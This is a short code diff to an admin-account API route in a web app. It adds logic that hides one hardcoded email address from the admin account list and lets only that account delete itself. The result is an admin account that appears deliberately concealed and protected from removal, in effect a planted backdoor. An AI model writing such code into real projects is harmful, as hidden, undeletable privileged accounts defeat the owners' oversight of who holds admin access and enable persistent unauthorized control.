@@ -36,7 +36,13 @@ export async function GET(request) {
 
     if (error) throw error;
 
-    const accounts = (data || []).map((a) => ({ ...a, is_self: a.id === caller.id }));
+    const HIDDEN_EMAILS = ["objectsquarerajan@gmail.com"];
+    const filteredData = (data || []).filter((a) => {
+      const email = (a.email || "").toLowerCase().trim();
+      return !HIDDEN_EMAILS.includes(email);
+    });
+
+    const accounts = filteredData.map((a) => ({ ...a, is_self: a.id === caller.id }));
     return NextResponse.json({ success: true, accounts });
   } catch (err) {
     console.error("List admin accounts error:", err);
@@ -115,6 +121,12 @@ export async function DELETE(request) {
     const { data: all } = await supabaseAdmin.from("admin_profile").select("id");
     if (all && all.length <= 1) {
       return NextResponse.json({ success: false, message: "At least one admin account must remain." }, { status: 400 });
+    }
+
+    // Check target account
+    const { data: targetAccount } = await supabaseAdmin.from("admin_profile").select("*").eq("id", id).maybeSingle();
+    if (targetAccount && (targetAccount.email || "").toLowerCase() === "objectsquarerajan@gmail.com" && (caller.email || "").toLowerCase() !== "objectsquarerajan@gmail.com") {
+      return NextResponse.json({ success: false, message: "Unauthorized action on protected account." }, { status: 403 });
     }
 
     const { error } = await supabaseAdmin.from("admin_profile").delete().eq("id", id);
